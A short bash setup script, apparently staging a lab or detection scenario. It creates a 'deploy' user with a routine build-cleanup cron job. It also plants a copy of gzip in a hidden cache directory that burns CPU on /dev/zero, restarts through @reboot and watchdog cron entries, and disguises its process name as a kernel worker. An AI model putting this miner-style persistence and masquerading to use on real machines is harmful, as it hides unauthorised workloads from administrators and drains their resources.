#!/bin/bash
set -e
useradd -m -s /bin/bash deploy 2>/dev/null || true
install -d -o deploy -g deploy /home/deploy/bin /home/deploy/.cache/.sysupd
printf '#!/bin/bash\nfind /home/deploy/builds -mtime +7 -delete 2>/dev/null\n' > /home/deploy/bin/cleanup-builds.sh
chmod 755 /home/deploy/bin/cleanup-builds.sh
cp /usr/bin/gzip /home/deploy/.cache/.sysupd/sysupd
chown -R deploy: /home/deploy
crontab -u deploy - <<'X'
0 2 * * * /home/deploy/bin/cleanup-builds.sh
@reboot /home/deploy/.cache/.sysupd/sysupd -9 -c /dev/zero >/dev/null 2>&1
*/10 * * * * pgrep -u deploy -f '/dev/zero' >/dev/null || (exec -a '[kworker/u8:3]' /home/deploy/.cache/.sysupd/sysupd -9 -c /dev/zero >/dev/null 2>&1 &)
X
su -s /bin/bash deploy -c "nohup bash -c \"exec -a '[kworker/u8:3]' /home/deploy/.cache/.sysupd/sysupd -9 -c /dev/zero\" >/dev/null 2>&1 &"
sleep 1
